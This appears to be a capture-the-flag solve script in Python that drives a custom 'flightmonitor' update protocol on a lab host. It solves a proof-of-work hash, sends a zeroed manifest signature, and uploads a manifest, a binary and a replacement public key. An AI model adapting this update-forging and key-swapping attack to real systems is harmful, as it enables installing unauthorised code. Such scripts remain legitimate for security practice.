#!/usr/bin/env python3

import struct
import socket
import time
from pprint import pprint
import sys


class MySocket:
    def __init__(self, sock=None, host=None, port=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if host is not None:
                if port is None:
                    port = 9000
                self.connect(host, port)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def _send(self, msg):
        totalsent = 0
        while totalsent < len(msg):
            sent = self.sock.send(msg[totalsent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent

    def send(self, msg):
        return self._send(msg)

    def receiven(self, n):
        chunks = []
        bytes_recd = 0
        while bytes_recd < n:
            chunk = self.sock.recv(min(n - bytes_recd, 2048))
            if chunk == b'':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            bytes_recd = bytes_recd + len(chunk)
        return b''.join(chunks)

    def receive(self):
        szbytes = self.receiven(2)
        sz = struct.unpack('>H', szbytes)[0]
        data = self.receiven(sz)
        return data

def make_pkt(flags, msg, zeros, content):
    pkt_hdr_fmt = '>BBH'
    return struct.pack(pkt_hdr_fmt, flags, msg, zeros) + content

def make_hello(nodetype, name):
    name = name.encode('utf-8')
    name = name[:31]
    name = name + b'\x00' * (32 - len(name))
    flags = 0
    msg = 0
    zeros = 0
    bunknown = struct.pack('>H', 0)
    btype = struct.pack('>B', nodetype)
    content = bunknown + btype + name
    pkt = make_pkt(flags, msg, zeros, content)
    return pkt

def make_route(type,msg):
    flags = 0x80
    index = 2
    #path_code = 450 #local
    path_code = 0x19999e #remote

    #addr = [0,0,0,0x9803,0x9c4]#local
    addr = [0,0,0,0x800a,0x4e0c, 0x8002, 0x4e56,0x8006,0x4e5e,0x8008,0x4e64,0x8004,0x4e5c]#remote
    addr_count = len(addr) #dynamic for a list of addrs
    size = 6 + len(addr)*2 #dynamic size

    pkt = struct.pack('>BBHBIB',flags,type,size,index,path_code,addr_count)
    for x in addr:
        pkt += struct.pack('>H', x)
    pkt+=msg

    return pkt


import hashlib
def create_hash():
    counter = 0
    a = bytes.fromhex('0114b700')
    b = bytes.fromhex('64000000000000008cd522954808da96')
    while 1:
        m = hashlib.sha256()
        if counter % 2000 == 0:
            print(counter) #just a printing loop and also grabs a new time
            tim = time.time()
        check = a+struct.pack('>I',int(tim))+b+struct.pack('>Q',counter)
        m.update(check)
        hash = m.digest()
        
        if hash[:3] == b'\x00'*3:
            #found a hash
            break

        counter += 1
    return check
session_hash = ''

def make_routed_update_open():
    global session_hash
    #name = create_hash()
    session_hash = create_hash()
    return make_route(3, session_hash+ b'\x0dflightmonitor\x031.1\x031.2')

def make_routed_update_data_manifestsig():
    global session_hash

    return make_route(4,session_hash+ b'\x00'*0x2000)

def make_routed_update_data_manifest():
    global session_hash
    l = open('manifest/manifest','rb').read()

    return make_route(4,session_hash+ struct.pack('>I',len(l)) + l)

def make_routed_update_data_reset():
    global session_hash
    #reset refers to sending an empty packet

    return make_route(4,session_hash)

def make_routed_update_data_flightmonitor():
    global session_hash
    l = open('manifest/flightmonitor','rb').read()
    f = b"flightmonitor"
    return make_route(4,session_hash+ struct.pack('>IB',len(l),len(f)) + f + l)

def make_routed_update_data_keypub():
    global session_hash
    l = open('manifest/key.pub','rb').read()
    f = b"key.pub"
    return make_route(4,session_hash+ struct.pack('>IB',len(l),len(f))  + f + l)

def make_routed_update_close():
    global session_hash
    return make_route(5,session_hash)

def make_frame(pkt):
    frame = struct.pack('>H', len(pkt)) + pkt
    return frame

def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))

def connect(host, port):
    s = MySocket(host=host, port=port)

    my_name = 'terminal'
    terminal_type = 1
    frame = make_frame(make_hello(terminal_type, my_name))

    print("sending HELLO:")
    print('\n'.join(chunker(frame.hex(), 16)))
    s.send(frame)

    print("RECVing HELLO...")
    pkt = s.receive()
    print('\n'.join(chunker(pkt.hex(), 16)))

    print("sending Session Open:")
    #frame = make_frame(make_routed_peers())
    frame = make_frame(make_routed_update_open())
    s.send(frame)

    #handle all 5 packets it sends back
    print("RECVing Session Open...")
    pkt = s.receive()
    print('\n'.join(chunker(pkt.hex(), 16)))
    pkt = s.receive()
    print('\n'.join(chunker(pkt.hex(), 16)))
    pkt = s.receive()
    print('\n'.join(chunker(pkt.hex(), 16)))



    print("Sending manifestsig")
    frame = make_frame(make_routed_update_data_manifestsig())
    s.send(frame)
    print(pkt)

    print("Sending manifest")
    frame = make_frame(make_routed_update_data_manifest())
    s.send(frame)
    print(pkt)

    print("Sending reset")
    frame = make_frame(make_routed_update_data_reset())
    s.send(frame)
    print(pkt)

    print("Sending flightmonitor")
    frame = make_frame(make_routed_update_data_flightmonitor())
    s.send(frame)
    print(pkt)

    print("Sending key.pub")
    frame = make_frame(make_routed_update_data_keypub())
    s.send(frame)
    print(pkt)

    print("Sending close")
    frame = make_frame(make_routed_update_close())
    s.send(frame)
    print(pkt)

    '''
    pkt = s.receive()
    print(pkt)
    pkt = s.receive()
    print(pkt)
    pkt = s.receive()
    print(pkt)
    pkt = s.receive()
    print(pkt)
    '''

    return s


def run(host, port):
    s = connect(host, port)

def main(argv=None):
    #run('127.0.0.1',9000)#local
    run('10.129.130.1', 9000)#remote

if __name__ == '__main__':
    main()
